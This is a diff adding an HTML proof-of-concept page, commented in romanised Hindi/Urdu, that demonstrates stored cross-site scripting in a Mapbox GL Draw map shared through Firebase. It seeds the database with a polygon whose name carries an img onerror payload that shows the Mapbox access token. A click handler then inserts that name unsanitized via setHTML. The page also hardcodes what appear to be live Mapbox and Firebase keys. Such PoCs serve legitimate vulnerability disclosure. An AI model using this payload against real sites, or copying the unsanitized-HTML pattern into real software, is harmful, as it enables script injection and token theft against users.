@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Mapbox GL Draw - Stored XSS PoC (Multi-User with Firebase)</title>
+  <script src="https://unpkg.com/mapbox-gl@latest/dist/mapbox-gl.js"></script>
+  <link href="https://unpkg.com/mapbox-gl@latest/dist/mapbox-gl.css" rel="stylesheet" />
+  <script src="https://unpkg.com/@mapbox/mapbox-gl-draw@latest/dist/mapbox-gl-draw.js"></script>
+  <link href="https://unpkg.com/@mapbox/mapbox-gl-draw@latest/dist/mapbox-gl-draw.css" rel="stylesheet" />
+  <style>body{margin:0}#map{position:absolute;top:0;bottom:0;width:100%}</style>
+
+  <!-- Firebase Scripts Add Kar (Yeh Zaroori Hai) -->
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-database-compat.js"></script>
+</head>
+<body>
+<div id="map"></div>
+<script>
+  mapboxgl.accessToken = 'pk.eyJ1Ijoic2hvYWliLTcxNzUiLCJhIjoiY21pcHY1YzZ3MDdvcjNlczZobzU1dHQwZCJ9.Wv4n-mMKS1a5cC8gQiU1cA'; // Apna real Mapbox token daal (test ke liye)
+
+  // Firebase Config Yahan Paste Kar (Jo Step 1 Se Mila)
+  const firebaseConfig = {
+    apiKey: "AIzaSyDNh7Bj1Jszio_PJzCsqGp5s0YDPx6KsMc",  // ← Yahan apna paste kar
+    authDomain: "shoaib-testing-78251.firebaseapp.com",
+    databaseURL: "https://shoaib-testing-78251-default-rtdb.firebaseio.com",  // ← Ye wala specially check kar
+    projectId: "shoaib-testing-78251",
+    storageBucket: "shoaib-testing-78251.firebasestorage.app",
+    messagingSenderId: "420349219566",
+    appId: "1:420349219566:web:03c946f063c15fd1b299ff"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+  const featuresRef = db.ref('features');  // Ye shared path hai – sab users yahan se read/write karenge
+
+  const map = new mapboxgl.Map({
+    container: 'map',
+    style: 'mapbox://styles/mapbox/streets-v12',
+    center: [70, 30],
+    zoom: 4
+  });
+
+  const draw = new MapboxDraw({displayControlsDefault: true});
+  map.addControl(draw);
+
+  // Page Load Hone Pe Firebase Se Saare Features Load Kar (User B Ke Liye)
+  featuresRef.once('value', (snapshot) => {
+    const data = snapshot.val();
+    if (data) {
+      Object.values(data).forEach(feature => {
+        if (feature && feature.geometry) {
+          draw.add(feature);  // Shared features add ho jaayenge
+        }
+      });
+    }
+  });
+
+  // Sirf Pehli Baar (User A) Malicious Feature Bana Aur Firebase Pe Save Kar
+  if (!localStorage.getItem('demo-initialized')) {  // Ye check karega ki sirf ek baar banaye (User A simulation)
+    const evil = {
+      type: "Feature",
+      properties: {
+        name: `<img src=x onerror="alert('Stored XSS Successful!\\n\\nToken: ' + mapboxgl.accessToken)">`
+      },
+      geometry: {
+        type: "Polygon",
+        coordinates: [[[65,25],[75,25],[75,35],[65,35],[65,25]]]
+      }
+    };
+    draw.add(evil);  // Map pe add kar
+    featuresRef.push(evil);  // Firebase pe save kar (shared ho jaayega)
+    localStorage.setItem('demo-initialized', 'true');  // Ab dobara nahi banayega
+  }
+
+  // Click Pe Popup Open Kar (XSS Trigger)
+  map.on('click', e => {
+    const features = draw.getFeatureIdsAt(e.point);
+    if (!features.length) return;
+    const f = draw.get(features[0]);
+    if (f?.properties?.name) {
+      new mapboxgl.Popup()
+        .setLngLat(e.lngLat)
+        .setHTML('<h3>Location:</h3>' + f.properties.name)  // Yahan unsanitized HTML jaata hai – XSS!
+        .addTo(map);
+    }
+  });
+</script>
+</body>
+</html>
